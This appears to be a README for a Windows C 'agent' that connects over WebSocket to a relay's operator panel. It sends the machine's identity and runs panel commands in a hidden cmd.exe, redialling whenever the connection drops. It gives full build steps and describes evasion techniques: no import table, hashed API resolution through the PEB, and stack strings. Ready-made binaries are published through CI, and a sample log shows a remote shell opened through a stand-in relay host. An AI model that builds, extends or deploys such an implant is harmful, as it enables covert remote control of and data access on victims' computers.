# WinHTTP WebSocket Relay Client (minimal_agent)

A small Windows network program in C, built on the
[WinHTTP](https://learn.microsoft.com/windows/win32/winhttp/winhttp-start-page)
API:

| Program | Source | What it does |
|---|---|---|
| `minimal_agent.exe` | `main.c` | Minimal agent with a remote shell: connects to a relay URL over WebSocket, identifies itself to the operator panel (750-byte Hello frame), and runs panel commands inside a local `cmd.exe` (Shell category). |

## Requirements

- Windows (**Windows 8+** for the WinHTTP WebSocket API)
- **MinGW-w64 gcc 16.1** (MSYS2 `ucrt64`) — no WinHTTP SDK headers are
  needed: the project keeps its own minimal type dictionary (`types.h`,
  `wintypes.h`) and resolves every OS call at runtime.

## Build

The single flavor is **dependency-free**: no CRT, no import table, no
`-lwinhttp`. Every OS call (WinHTTP included) is resolved at runtime via
the PEB; the process starts at our own entry (`entry.c`), not the CRT
startup. Two steps — compile, then link.

**PowerShell** (from the repo root; MSYS2 `ucrt64` on PATH):

```powershell
# 1) compile (objects go to a separate dir, the repo root stays clean)
gcc -O2 -c entry.c main.c transport.c shell.c report.c system_facts.c `
    winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c `
    peb.c system.c djb2.c logger.c
New-Item -ItemType Directory -Force obj | Out-Null
Move-Item *.o obj

# 2) link (entry.o MUST be in the list; -e entry names the real entry point)
gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe `
    obj\entry.o obj\main.o obj\transport.o obj\shell.o obj\report.o `
    obj\system_facts.o obj\winhttp_api.o obj\ntdll.o obj\kernel32.o `
    obj\advapi.o obj\string.o obj\memory.o obj\peb.o obj\system.o `
    obj\djb2.o obj\logger.o
```

Two gates to check after linking:

```powershell
# gate 1: empty import table — must print NOTHING
objdump -p minimal_agent.exe | Select-String "DLL Name"   # no output = OK

# gate 2: the entry point is OUR entry, not a linker default.
# The shipped exe is stripped (-s), so nm sees no symbols in it —
# link an unstripped CHECK copy of the same objects and compare:
gcc -O2 -nostdlib -e entry -o ma_check.exe (Get-ChildItem obj\*.o | ForEach-Object FullName)
nm ma_check.exe | Select-String " T entry"               # -> ... T entry
objdump -f ma_check.exe | Select-String "start address"  # -> same address
Remove-Item ma_check.exe

# paste-safe one-liner for the whole gate 2 (if a paste eats line breaks):
gcc -O2 -nostdlib -e entry -o ma_check.exe (Get-ChildItem obj\*.o | ForEach-Object FullName); nm ma_check.exe | Select-String " T entry"; objdump -f ma_check.exe | Select-String "start address"; Remove-Item ma_check.exe
```

**bash** (MSYS2 shell) equivalent:

```sh
gcc -O2 -c entry.c main.c transport.c shell.c report.c system_facts.c \
    winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c \
    peb.c system.c djb2.c logger.c && mkdir -p obj && mv *.o obj/
gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe obj/*.o
objdump -p minimal_agent.exe | grep "DLL Name"          # no output = OK
gcc -O2 -nostdlib -e entry -o /tmp/ma_check.exe obj/*.o
nm /tmp/ma_check.exe | grep " T entry"                  # -> ... T entry
objdump -f /tmp/ma_check.exe | grep "start address"     # -> same address
```

Gate 2 matters because omitting `-e entry` (or losing `entry.o` from the
list) silently leaves the linker default entry in place — the binary
builds but crashes at startup (see `entry.h` for the contract).

The agent is split into small modules, one topic per header:

| File | Topic |
|---|---|
| `entry.c` | CRT-free process entry: zeroes `.bss`, builds argv from the PEB, exits via `ExitProcess` |
| `main.c` | `agent_main`: connect, dispatch commands, cleanup |
| `protocol.h` | opcodes, statuses, identity frame, capability mask |
| `wire.h` | tiny little-endian writers (header-only) |
| `transport.h/.c` | the WebSocket pipe: `ws_send` / `ws_receive` |
| `shell.h/.c` | the cmd.exe pool: spawn / read / write / teardown |
| `report.h/.c` | human-facing output: errors, hex dumps, decoders |
| `system_facts.h/.c` | machine UUID + hostname / user / OS facts |
| `winhttp_api.h/.c` | the WinHTTP vtable + `LdrLoadDll` bootstrap |
| `kernel32.h/.c`, `ntdll.h/.c`, `advapi.h/.c` | per-DLL function tables |
| `peb.h/.c` | TEB/PEB access and the loader module-list walk |
| `system.h/.c` | PE export-table resolve (by name and by hash) |
| `apihash.h` | precomputed djb2 constants for every module/export name |
| `stackstrings.h` | module names built on the stack (no `.rdata` literals) |
| `djb2.h/.c` | the djb2 hash used by both resolve paths |
| `string.c`, `memory.c`, `logger.c` | hand-rolled CRT replacements |

## CI / Releases (GitHub Actions)

Cross-builds the three Windows arches with the
[llvm-mingw](https://github.com/mstorsjo/llvm-mingw) toolchain (i686 /
x86_64 / aarch64) using the same flags as the local build, and bakes the
identity frame's metadata (`-DID_BUILD_NUMBER=...`,
`-DAGENT_COMMIT_HASH=...`; local builds fall back to the in-code defaults):

- **build.yml** — on every push/PR to `main`: compile check; on pushes, also
  republishes the rolling **`preview`** pre-release carrying
  `windows-i386.exe`, `windows-x86_64.exe`, `windows-aarch64.exe`;
- **release.yml** — on a `v*` tag (or manual dispatch): the same binaries
  published as a stable GitHub Release.

## Usage

```
minimal_agent.exe <URL>          # quiet mode (default): one line per event
minimal_agent.exe <URL> -v       # verbose: dump every command's raw bytes
```

A **minimal agent with a remote shell** for the relay protocol. It connects,
upgrades the HTTP connection to WebSocket, and then serves the operator panel.
A lost connection is a normal event, not an error: the agent redials with a
capped backoff (1..32 s, reset after a healthy session) and keeps serving.
Live shells survive a redial (their pool is per-process, not per-connection);
only the `Exit` command ends the agent:

- `0x00 Hello` -> replies with the full 750-byte identity frame: machine UUID
  (from the registry `MachineGuid`, .NET Guid byte order), hostname, logged-on
  user, architecture, platform, OS version, build metadata, API version 4, and
  a capability mask with **Shell (bit 1) set**;
- `0x0A OpenShell` -> spawns a hidden `cmd.exe` (code page switched to UTF-8)
  wired to two pipes, allocates a shell id from a 256-slot pool (v4 framing:
  the agent owns shell identity), and returns the id;
- `0x04 WriteShell` / `0x05 ReadShell` -> feed operator input to the shell's
  stdin / drain buffered stdout back to the panel (reading never blocks; the
  panel's adaptive 250..3000 ms polling drives the output flow);
- `0x08 CloseShell` -> terminates the shell process and frees its slot;
- `0x09 Exit` -> terminates the agent without replying (the only such command);
- any other command -> replies `status = 1` ("not implemented").

A side effect of advertising Shell without FileSystem: the panel's file
manager automatically switches to its PowerShell-over-shell backend, so a
basic file browser works too without any file opcodes in the agent.

Sample output (quiet mode):

```
[1] Connecting to https://relay.example.com/agent ... connected (HTTP 101 Switching Protocols)
[2] Agent mode: replying to commands (capability mask = Shell)...
[+] identity sent to the panel (750 bytes)
[+] shell 0 opened (cmd.exe spawned) - id sent
[+] write to shell 0 - status 0
[+] read shell 0 - 9 byte(s)
[i] read shell 0 - idle
[i] connection lost - redialing in 1 s ...
[1] Connecting to https://relay.example.com/agent ... connected (HTTP 101 Switching Protocols)
```

With `-v` every received command is additionally dumped decoded (opcode name +
payload + raw bytes), and the full identity frame is printed field by field.
Note that WinHTTP does not expose raw RFC 6455 frame opcodes - the printed
"type" is the WinHTTP buffer type (0 = binary message, 2 = UTF-8 message,
1/3 = fragments, 4 = close).

How the WebSocket upgrade works: an ordinary HTTPS GET request is created,
`WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET` makes WinHTTP add the handshake headers,
`WinHttpSendRequest` + `WinHttpReceiveResponse` exchange the
`101 Switching Protocols` response, and `WinHttpWebSocketCompleteUpgrade`
returns the handle used for `WinHttpWebSocketReceive`.

## Notes / Limitations

- The agent implements the identification and shell parts of the relay
  protocol; there is no native file or screen functionality (the panel covers
  files via its PowerShell-over-shell fallback). Shells die with the agent
  process, but survive connection losses (the agent redials; the panel just
  sees the shell ids again when it re-opens them). Detection note: the
  connection pattern it produces (periodic connect to a single fixed host with
  a non-browser user agent) is trivially visible to network monitoring.
